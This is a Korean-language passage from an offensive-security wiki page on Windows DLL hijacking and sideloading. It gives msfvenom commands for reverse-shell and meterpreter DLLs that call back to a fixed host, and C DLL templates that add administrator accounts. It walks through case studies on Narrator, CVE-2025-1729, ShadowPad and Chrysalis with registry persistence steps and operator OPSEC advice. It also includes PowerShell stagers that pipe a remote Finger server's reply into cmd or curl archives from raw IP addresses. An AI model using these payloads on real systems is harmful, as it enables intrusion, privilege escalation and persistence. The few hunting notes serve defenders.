악용 가능한 시나리오를 찾았다면, 이를 성공적으로 악용하기 위해 가장 중요한 것은 **실행 파일이 해당 DLL에서 가져오는 모든 함수를 최소한 내보내는 DLL을 만드는 것**입니다. 어쨌든 DLL Hijacking은 [Medium Integrity level에서 High로 **(UAC 우회)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [**High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system)** 권한을 상승시키는 데** 유용합니다. DLL hijacking을 실행에 활용하는 이 연구에서 **유효한 DLL을 만드는 방법**의 예를 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한 **다음 섹션**에서는 **템플릿**으로 활용하거나 **필수가 아닌 함수를 내보내는 DLL**을 만들 때 유용한 **기본 DLL 코드**를 확인할 수 있습니다.

## **Creating and compiling DLLs**

### **DLL Proxifying**

기본적으로 **DLL proxy**는 **로드될 때 악성 코드를 실행**할 수 있을 뿐 아니라, 실제 라이브러리로 모든 호출을 전달해 **예상대로 동작하고** 해당 라이브러리의 기능을 **노출하는** DLL입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 실행 파일을 **지정하고 프록시화할 라이브러리를 선택**해 **프록시화된 DLL을 생성**하거나, DLL을 **지정해 프록시화된 DLL을 생성**할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter (x86) 얻기:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**사용자 생성 (x86 버전은 확인했지만 x64 버전은 보지 못함):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 직접 만들기

많은 경우, 컴파일하는 DLL은 **피해자 프로세스가 가져오는 모든 함수를 export해야 합니다**. 필요한 export가 누락되면 바이너리가 해당 함수를 확인할 수 없어 exploit이 실패합니다.

<details>
<summary>C DLL 템플릿 (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>사용자 생성이 포함된 C++ DLL 예제</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>스레드 진입점이 있는 대체 C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (접근성/AT)

Windows Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 계속 확인하며, 이를 hijack하면 임의 코드 실행 및 persistence가 가능합니다.<sup>[[7]](#references)</sup>

주요 사실
- 확인 경로(현재 빌드): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 레거시 경로(이전 빌드): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore 경로에 공격자가 제어하는 쓰기 가능한 DLL이 있으면 해당 DLL이 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. exports는 필요하지 않습니다.

Procmon으로 확인
- 필터: `Process Name is Narrator.exe` 및 `Operation is Load Image` 또는 `CreateFile`.
- Narrator를 시작하고 위 경로의 로드 시도를 확인합니다.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC 침묵
- 단순한 hijack은 UI에서 표시되거나 소리를 냅니다. 조용히 수행하려면 attach 시 Narrator의 스레드를 열거하고, 메인 스레드를 열어(`OpenThread(THREAD_SUSPEND_RESUME)`) 중단합니다(`SuspendThread`). 작업은 자체 스레드에서 계속 진행합니다. 전체 코드는 PoC를 참고하세요.<sup>[[8]](#references)</sup>

Accessibility 구성으로 트리거 및 persistence 설정
- 사용자 컨텍스트(HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM(HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위와 같이 설정하면 Narrator를 시작할 때 심어 둔 DLL이 로드됩니다. Secure Desktop(로그인 화면)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면 DLL이 Secure Desktop에서 SYSTEM 권한으로 실행됩니다.

RDP 트리거를 통한 SYSTEM 실행(lateral movement)
- Classic RDP security layer 허용: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 뒤 로그인 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행합니다. DLL이 Secure Desktop에서 SYSTEM 권한으로 실행됩니다.
- RDP 세션이 닫히면 실행이 중단되므로, 신속히 inject/migrate하세요.

Bring Your Own Accessibility (BYOA)
- 기본 제공 Accessibility Tool(AT)의 레지스트리 항목(예: CursorIndicator)을 복제하고, 임의의 바이너리/DLL을 가리키도록 수정한 뒤 가져오고 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이를 통해 Accessibility framework를 이용해 임의의 코드를 실행할 수 있습니다.

참고 사항
- `%windir%\System32`에 파일을 쓰고 HKLM 값을 변경하려면 관리자 권한이 필요합니다.
- 모든 payload 로직은 `DLL_PROCESS_ATTACH`에 넣을 수 있으며, exports는 필요하지 않습니다.

## 사례 연구: CVE-2025-1729 - TPQMAssistant.exe를 이용한 권한 상승

이 사례에서는 Lenovo의 TrackPoint Quick Menu(`TPQMAssistant.exe`)에서 발생하는 **Phantom DLL Hijacking**을 다룹니다. 이 취약점은 **CVE-2025-1729**로 추적되고 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>

### 취약점 세부 정보

- **구성 요소**: `C:\ProgramData\Lenovo\TPQM\Assistant\`에 있는 `TPQMAssistant.exe`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`가 매일 오전 9시 30분에 로그인한 사용자의 컨텍스트로 실행됩니다.
- **디렉터리 권한**: `CREATOR OWNER`가 쓰기 가능하므로 로컬 사용자가 임의의 파일을 넣을 수 있습니다.
- **DLL 검색 동작**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려고 시도하고, 파일이 없으면 "NAME NOT FOUND"를 기록합니다. 이는 로컬 디렉터리 검색이 우선됨을 나타냅니다.

### Exploit 구현

공격자는 동일한 디렉터리에 악성 `hostfxr.dll` 스텁을 배치해 누락된 DLL을 악용하고, 사용자 컨텍스트에서 코드를 실행할 수 있습니다:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 공격 흐름

1. 표준 사용자로 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 복사합니다.
2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9시 30분에 실행될 때까지 기다립니다.
3. 작업 실행 시 관리자가 로그인되어 있으면 악성 DLL이 관리자 세션에서 medium integrity로 실행됩니다.
4. 표준 UAC bypass 기법을 연결해 medium integrity에서 SYSTEM 권한으로 상승합니다.

## 사례 연구: MSI CustomAction 드로퍼 + 서명된 호스트(wsc_proxy.exe)를 통한 DLL 사이드로딩

위협 행위자들은 신뢰할 수 있는 서명된 프로세스에서 페이로드를 실행하기 위해 MSI 기반 드로퍼와 DLL 사이드로딩을 자주 함께 사용합니다.<sup>[[10]](#references)</sup>

체인 개요
- 사용자가 MSI를 다운로드합니다. GUI 설치 중 CustomAction이 조용히 실행되어(예: LaunchApplication 또는 VBScript 액션) 내장 리소스에서 다음 단계를 재구성합니다.
- 드로퍼는 정상적으로 서명된 EXE와 악성 DLL을 같은 디렉터리에 기록합니다(예시 조합: Avast 서명 wsc_proxy.exe + 공격자가 제어하는 wsc.dll).
- 서명된 EXE가 시작되면 Windows DLL 검색 순서에 따라 작업 디렉터리의 wsc.dll이 먼저 로드되어, 서명된 부모 프로세스에서 공격자 코드를 실행합니다(ATT&CK T1574.001).

MSI 분석(확인할 항목)
- CustomAction 테이블:
  - 실행 파일이나 VBScript를 실행하는 항목을 찾습니다. 의심스러운 패턴의 예: LaunchApplication이 백그라운드에서 내장 파일을 실행합니다.
  - Orca(Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사합니다.
- MSI CAB 내의 페이로드 분할 및 포함 여부:
  - 관리자 권한으로 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
  - 또는 lessmsi 사용: lessmsi x package.msi C:\out
  - VBScript CustomAction이 이어 붙이고 복호화하는 여러 개의 작은 조각을 찾습니다. 일반적인 흐름:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe를 사용한 실전 sideloading
- 다음 두 파일을 같은 폴더에 둡니다.
  - wsc_proxy.exe: 서명된 정상 호스트(Avast). 프로세스는 해당 디렉터리에서 이름으로 wsc.dll을 로드하려고 합니다.
  - wsc.dll: 공격자 DLL. 특정 exports가 필요하지 않다면 DllMain만으로 충분합니다. 그 외에는 proxy DLL을 빌드해 필요한 exports를 정품 라이브러리로 전달하면서 DllMain에서 payload를 실행합니다.
- 최소한의 DLL payload를 빌드합니다:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- export 요구사항을 충족하려면 proxying framework(예: DLLirant/Spartacus)를 사용해 payload도 실행하는 forwarding DLL을 생성하세요.

- 이 기법은 host binary의 DLL name resolution에 의존합니다. host가 absolute path 또는 safe loading flags(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, forwarded exports는 우선순위에 영향을 줄 수 있으므로 host binary와 export set을 선택할 때 고려해야 합니다.

## 서명된 triad + 암호화된 payload (ShadowPad 사례 연구)

Check Point는 Ink Dragon이 **3개 파일로 이루어진 triad**를 사용해 합법적인 소프트웨어처럼 위장하면서 핵심 payload를 디스크에서 암호화된 상태로 유지하는 방식으로 ShadowPad를 배포한다고 설명했습니다:<sup>[[12]](#references)</sup>

1. **서명된 host EXE** – AMD, Realtek, NVIDIA 등의 벤더가 악용됩니다(`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). 공격자는 실행 파일의 이름을 Windows binary처럼 보이게 바꾸지만(예: `conhost.exe`), Authenticode signature는 유효하게 유지합니다.
2. **악성 loader DLL** – 예상된 이름으로 EXE 옆에 드롭됩니다(`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL은 대개 ScatterBrain framework로 난독화된 MFC binary이며, 암호화된 blob을 찾아 복호화한 뒤 ShadowPad를 reflective하게 매핑하는 역할만 합니다.
3. **암호화된 payload blob** – 같은 디렉터리에 `<name>.tmp`로 저장되는 경우가 많습니다. 복호화된 payload를 memory-mapping한 뒤 loader는 TMP 파일을 삭제해 forensic 증거를 없앱니다.

Tradecraft 참고 사항:

* PE header의 원래 `OriginalFileName`은 유지하면서 서명된 EXE의 이름을 바꾸면, 벤더 signature를 유지한 채 Windows binary처럼 위장할 수 있습니다. 따라서 Ink Dragon의 방식을 따라 실제로는 AMD/NVIDIA 유틸리티인 `conhost.exe`처럼 보이는 binary를 드롭하세요.
* 실행 파일은 신뢰된 상태로 유지되므로 대부분의 allowlisting control에서는 악성 DLL을 그 옆에 두기만 하면 됩니다. loader DLL을 맞춤화하는 데 집중하세요. 일반적으로 서명된 상위 프로세스는 수정 없이 실행할 수 있습니다.
* ShadowPad decryptor는 TMP blob이 loader 옆에 있고, 매핑 후 파일을 덮어쓸 수 있도록 쓰기 가능한 상태일 것을 전제로 합니다. payload가 로드될 때까지 디렉터리를 쓰기 가능하게 유지하세요. 메모리에 로드된 뒤에는 OPSEC을 위해 TMP 파일을 안전하게 삭제할 수 있습니다.

### LOLBAS stager + staged archive sideloading chain (Finger → tar/curl → WMI)

운영자는 DLL sideloading을 LOLBAS와 결합해 디스크에 남는 사용자 지정 artifact가 신뢰된 EXE 옆의 악성 DLL뿐이도록 합니다:<sup>[[1]](#references)</sup>

- **원격 명령 loader (Finger):** 숨겨진 PowerShell이 `cmd.exe /c`를 실행해 Finger server에서 명령을 가져온 뒤 `cmd`로 전달합니다:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host`는 TCP/79 텍스트를 가져옵니다. `| cmd`는 서버 응답을 실행하므로 운영자는 서버 측에서 두 번째 단계의 서버를 교체할 수 있습니다.

- **기본 제공 다운로드/압축 해제:** 무해한 확장자를 사용해 아카이브를 다운로드하고 압축을 푼 다음, 임의의 `%LocalAppData%` 폴더에 sideload 대상과 DLL을 배치합니다:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L`은 진행 상황을 숨기고 리디렉션을 따르며, `tar -xf`는 Windows에 기본 포함된 tar를 사용합니다.

- **WMI/CIM 실행:** WMI를 통해 EXE를 시작하면, 함께 배치된 DLL을 로드하는 동안 원격 분석에 CIM이 생성한 프로세스로 표시됩니다:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - 로컬 DLL을 우선 사용하는 바이너리(예: `intelbq.exe`, `nearby_share.exe`)에서 작동합니다. 페이로드(예: Remcos)는 신뢰할 수 있는 이름으로 실행됩니다.

- **헌팅:** `/p`, `/m`, `/c`가 함께 나타나는 `forfiles`에 경고를 설정하세요. 관리자 스크립트 외에는 드뭅니다.


## 사례 연구: NSIS 드로퍼 + Bitdefender Submission Wizard 사이드로딩 (Chrysalis)

최근 Lotus Blossom 침입 사례에서는 신뢰할 수 있는 업데이트 체인을 악용해 NSIS로 패킹된 드로퍼를 전달했습니다. 이 드로퍼는 DLL 사이드로딩과 완전히 메모리 내에서 실행되는 페이로드를 준비했습니다.<sup>[[13]](#references)</sup>

Tradecraft 흐름
- `update.exe` (NSIS)는 `%AppData%\Bluetooth`를 만들고 **HIDDEN**으로 표시한 뒤, 이름을 바꾼 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 암호화된 blob `BluetoothService`를 저장하고 EXE를 실행합니다.
- 호스트 EXE는 `log.dll`을 import하고 `LogInit`/`LogWrite`를 호출합니다. `LogInit`은 blob을 mmap으로 로드하고, `LogWrite`는 사용자 지정 LCG 기반 스트림(**0x19660D** / **0x3C6EF35F** 상수, 이전 해시에서 파생한 키 자료)으로 blob을 복호화해 버퍼를 평문 셸코드로 덮어쓰고, 임시 데이터를 해제한 뒤 셸코드로 점프합니다.
- IAT를 사용하지 않기 위해, 로더는 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**로 export 이름을 해싱한 다음 Murmur 스타일 avalanche(**0x85EBCA6B**)를 적용하고, salt가 적용된 대상 해시와 비교해 API를 확인합니다.

주요 셸코드 (Chrysalis)
- 키 `gQ2JR&9;`를 사용해 5회 반복하여 add/XOR/sub 연산을 수행함으로써 PE와 유사한 메인 모듈을 복호화한 다음, `Kernel32.dll` → `GetProcAddress`를 동적으로 로드해 import 확인을 마칩니다.
- 문자별 bit-rotate/XOR 변환을 이용해 런타임에 DLL 이름 문자열을 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드합니다.
- 두 번째 resolver는 **PEB → InMemoryOrderModuleList**를 순회하고, 각 export table을 4바이트 블록 단위로 파싱하며 Murmur 스타일 mixing을 적용합니다. 해시를 찾지 못한 경우에만 `GetProcAddress`로 대체합니다.

임베디드 설정 및 C2
- 설정은 드롭된 `BluetoothService` 파일의 **오프셋 0x30808**(크기 **0x980**)에 있으며, 키 `qwhvb^435h&*7`로 RC4 복호화하면 C2 URL과 User-Agent가 드러납니다.
- Beacon은 점으로 구분된 호스트 프로필을 만들고, 태그 `4Q`를 앞에 붙인 뒤 키 `vAuig34%^325hGV`로 RC4 암호화하여 HTTPS를 통해 `HttpSendRequestA`로 전송합니다. 응답은 RC4 복호화한 뒤 태그 switch로 처리합니다(`4T` 셸, `4V` 프로세스 실행, `4W/4X` 파일 쓰기, `4Y` 읽기/유출, `4\\` 제거, `4` 드라이브/파일 열거 + 청크 단위 전송 사례).
- 실행 모드는 CLI 인수로 제어됩니다. 인수가 없으면 `-i`를 가리키도록 persistence(service/Run key)를 설치하고, `-i`는 `-k`를 사용해 자신을 다시 실행하며, `-k`는 설치를 건너뛰고 페이로드를 실행합니다.

관찰된 대체 로더
- 동일한 침입에서 Tiny C Compiler도 저장했으며, `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행하고 옆에 `libtcc.dll`을 두었습니다. 공격자가 제공한 C 소스에는 셸코드가 포함되어 있어 컴파일 후 메모리에서 실행되었으며, PE가 디스크에 기록되지 않았습니다. 다음과 같이 재현합니다:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- 이 TCC 기반 컴파일 후 실행 단계는 런타임에 `Wininet.dll`을 가져오고 하드코딩된 URL에서 2단계 shellcode를 가져와, 컴파일러 실행으로 위장하는 유연한 loader를 제공했습니다.

## 서명된 호스트 sideloading: export 프록시 및 호스트 스레드 대기

일부 DLL sideloading 체인에는 **안정성 개선 기법**이 포함되어 있어, 악성 DLL이 로드된 뒤 충돌하지 않고 이후 단계가 문제없이 로드될 때까지 정상 호스트를 실행 상태로 유지합니다.<sup>[[11]](#references)</sup>

관찰된 패턴
- 신뢰할 수 있는 EXE를 예상되는 종속 DLL 이름(예: `version.dll`)을 가진 악성 DLL과 같은 디렉터리에 둡니다.
- 악성 DLL은 예상되는 모든 export를 실제 시스템 DLL(예: `%SystemRoot%\\System32\\version.dll`)로 **프록시**하여 import 확인이 계속 성공하고 호스트 프로세스가 계속 작동하도록 합니다.
- 로드된 후 악성 DLL은 호스트 진입점을 **패치**하여 메인 스레드가 종료되거나 프로세스를 끝내는 코드 경로를 실행하지 않고 무한 `Sleep` 루프에 들어가게 합니다.
- 새 스레드가 실제 악성 동작을 수행합니다. 다음 단계 DLL의 이름이나 경로를 복호화(RC4/XOR가 흔함)한 다음 `LoadLibrary`로 실행합니다.

중요한 이유
- 일반적인 DLL 프록시는 API 호환성을 유지하지만, 이후 단계가 실행될 만큼 호스트가 오래 살아 있을지는 보장하지 않습니다.
- 메인 스레드를 `Sleep(INFINITE)`에서 대기시키는 것은 loader가 작업자 스레드에서 복호화, staging 또는 네트워크 초기화를 수행하는 동안 서명된 프로세스를 상주 상태로 유지하는 간단한 방법입니다.
- 의심스러운 `DllMain`만 탐지하면, 호스트 진입점이 패치되고 보조 스레드가 시작된 뒤에 흥미로운 동작이 발생하는 이 패턴을 놓칠 수 있습니다.

최소 작업 흐름
1. 서명된 호스트 EXE를 복사하고 로컬 디렉터리에서 어떤 DLL을 확인하는지 파악합니다.
2. 동일한 함수를 export하고 정상 DLL로 전달하는 프록시 DLL을 빌드합니다.
3. `DllMain(DLL_PROCESS_ATTACH)`에서 작업자 스레드를 생성합니다.
4. 해당 스레드에서 호스트 진입점이나 메인 스레드 시작 루틴을 패치해 `Sleep`을 반복하도록 합니다.
5. 다음 단계 DLL 이름/설정을 복호화하고 `LoadLibrary`를 호출하거나 payload를 manual-map합니다.

방어 관점의 단서
- 서명된 프로세스가 `System32` 대신 자체 애플리케이션 디렉터리에서 `version.dll` 또는 이와 유사한 공용 라이브러리를 로드하는 경우.
- 이미지 로드 직후 프로세스 진입점에서 발생하는 메모리 패치. 특히 `Sleep`/`SleepEx`로 분기하거나 호출하도록 리디렉션되는 경우.
- 프록시 DLL이 생성한 스레드가 복호화된 이름의 두 번째 DLL에서 즉시 `LoadLibrary`를 호출하는 경우.
- `ProgramData`, `%TEMP%` 또는 압축 해제된 아카이브 경로와 같은 쓰기 가능한 staging 디렉터리에서 공급업체 실행 파일 옆에 배치된 전체 export 프록시 DLL.

## References

- [1] [Red Canary – Intelligence Insights: 2026년 1월](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe를 이용한 권한 상승](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows의 DLL hijacking: 간단한 C 예제](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, 유럽을 겨냥한 새로운 malware 배포](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks와 Windows Helper의 만남](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – 디지털 도플갱어: Gh0st RAT을 배포하는 진화하는 사칭 캠페인의 구조](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 이해관계의 수렴: 동남아시아 정부를 겨냥한 위협 클러스터 분석](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon의 내부: 은밀한 공격 작전의 중계 네트워크와 작동 방식 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom 도구 모음 심층 분석](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack 체인](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – 이란 APT Screening Serpens의 2026년 첩보 캠페인 추적](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – 빠르고 거침없이: 이란 분쟁 중 Nimbus Manticore의 작전](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – 작업 동작](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, 동남아시아 정부와 핵심 인프라를 표적으로 삼다](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE 형식](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – 정상 소프트웨어에 내장된 SectopRAT 변종의 실체 파악](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
